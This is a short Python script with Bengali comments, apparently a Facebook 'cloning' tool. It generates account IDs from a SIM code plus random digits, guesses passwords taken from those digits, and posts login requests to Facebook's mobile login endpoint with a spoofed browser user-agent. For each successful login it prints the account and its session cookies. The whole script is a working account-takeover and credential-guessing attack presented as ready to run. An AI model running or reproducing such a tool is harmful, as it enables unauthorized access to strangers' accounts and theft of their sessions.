import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' 
G = '\033[1;32m' 
W = '\033[1;37m' 

def banner():
    os.system('clear')
    print(f"{G}[✓] DEVELOPED BY : MD MALEK ISLAM")
    print(f"×××××××××××××××××××××××××××××××××××××××××××××××××{W}")

def cloning_start():
    code = input(f'{G}[+] ENTER SIM CODE : {W}')
    limit = int(input(f'{G}[+] ENTER CLONING LIMIT : {W}'))
    
    print(f'\n{G}[/] REAL ATTACK STARTED...\n')

    for i in range(limit):
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড

        # ১. স্যার যেটা বললেন: Header ব্যবহার করা
        headers = {
            'authority': 'touch.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
        }

        # ২. স্যার যেটা বললেন: Response/Login Logic (POST Request)
        # এখানে আসল লজিক কাজ করবে
        data = {'email': uid, 'pass': pws}
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        try:
            # স্যারের দেওয়া লিঙ্ক ব্যবহার করে রিকোয়েস্ট পাঠানো হচ্ছে
            response = requests.post(url, headers=headers, data=data)
            
            # ৩. রেসপন্স চেক করা (এটিই আসল রিফ্যাক্টর লজিক)
            if "c_user" in response.cookies.get_dict():
                print(f'{G}[MALEK-OK💚] {uid} • {pws} xxx') 
                print(f'{G}[🌺] COOKIE = {response.cookies.get_dict()}\n')
            else:
                # যদি লগইন না হয় (র্যান্ডমলি জেনারেটেড আইডি সাধারণত হবে না)
                print(f'{R}[MALEK-CP💔] {uid} • {pws} (Checking...)\n')
        except:
            pass
        
        time.sleep(2.0) # ২ সেকেন্ড বিরতি

    print(f'{G}[00000] [OK:0]{W}')
    input(f'\n{G} [ BACK ]{W}')

if __name__ == "__main__":
    cloning_start()
